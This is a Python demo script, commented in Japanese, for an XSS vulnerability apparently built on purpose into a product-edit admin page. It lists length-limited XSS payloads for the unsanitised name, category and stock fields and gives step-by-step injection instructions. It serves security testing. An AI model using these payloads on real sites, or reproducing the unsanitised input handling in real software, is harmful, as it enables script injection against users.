#!/usr/bin/env python3
"""
商品編集XSS脆弱性デモンストレーション

このスクリプトは実装された脆弱性の動作を確認するためのものです。

脆弱性の概要:
1. name: 18文字制限、サニタイズなし
2. description: 文字数制限なし、サニタイズあり  
3. category: 17文字制限、サニタイズなし
4. stock: 17文字制限、サニタイズなし
"""

def main():
    print("=== 商品編集XSS脆弱性デモ ===\n")
    
    print("脆弱性のあるフィールド:")
    print("  • name (商品名): 18文字制限、サニタイズなし")
    print("  • category (カテゴリ): 17文字制限、サニタイズなし")
    print("  • stock (在庫数): 17文字制限、サニタイズなし")
    print()
    
    print("安全なフィールド:")
    print("  • description (説明): サニタイズあり")
    print()
    
    print("テスト用ペイロード:")
    
    # 18文字以内のXSSペイロード (name用)
    name_payloads = [
        "<script>alert(1)</script>",  # 23文字 - 制限オーバー
        "<img src=x onerror=alert(1)>",  # 26文字 - 制限オーバー  
        "'+alert(1)+'",  # 12文字 - OK
        "<svg onload=a()>",  # 15文字 - OK
        "'-alert(1)-'",  # 12文字 - OK
        "<h1>XSS</h1>",  # 12文字 - OK
        "<img src=x>",  # 12文字 - OK
        "javascript:a()",  # 13文字 - OK
        "<script>a()</script>",  # 19文字 - 制限オーバー
    ]
    
    # 17文字以内のXSSペイロード (category/stock用)
    other_payloads = [
        "<script>alert(1)</script>",  # 23文字 - 制限オーバー
        "'+alert(1)+'",  # 12文字 - OK
        "<svg onload=a()>",  # 15文字 - OK
        "'-alert(1)-'",  # 12文字 - OK
        "<h1>XSS</h1>",  # 12文字 - OK
        "<img src=x>",  # 12文字 - OK
        "javascript:a()",  # 13文字 - OK
        "<script>a()",  # 11文字 - OK
        "alert(1)",  # 8文字 - OK
    ]
    
    print("\n18文字以内のペイロード (name用):")
    for payload in name_payloads:
        if len(payload) <= 18:
            print(f"  ✓ {payload} ({len(payload)}文字)")
    
    print("\n17文字以内のペイロード (category/stock用):")
    for payload in other_payloads:
        if len(payload) <= 17:
            print(f"  ✓ {payload} ({len(payload)}文字)")
    
    print("テスト手順:")
    print("1. 管理者でログイン (user_id=1)")
    print("2. /admin/products で商品を追加:")
    print("   - 商品名: '<h1>XSS</h1>' (12文字)")  
    print("   - カテゴリ: '<svg onload=a()>' (15文字)")
    print("   - 在庫数: '<img src=x>' (12文字)")
    print("   - 説明: '<script>alert(1)</script>' (サニタイズされる)")
    print("3. 商品一覧で結果確認")
    print("4. 既存商品を編集してペイロード注入")
    print()
    
    print("実際のペイロード例:")
    name_safe = [p for p in name_payloads if len(p) <= 18]
    other_safe = [p for p in other_payloads if len(p) <= 17]
    
    for i, payload in enumerate(name_safe[:3], 1):
        print(f"   {i}. name: '{payload}'")
    
    for i, payload in enumerate(other_safe[:3], 1):
        print(f"   {i}. category/stock: '{payload}'")
        print()
    
    print("期待される動作:")
    print("- name、category、stockでHTMLが実行される")
    print("- descriptionではHTMLがエスケープされる")
    print("- name: 18文字、category/stock: 17文字を超える入力は拒否される")

if __name__ == "__main__":
    main()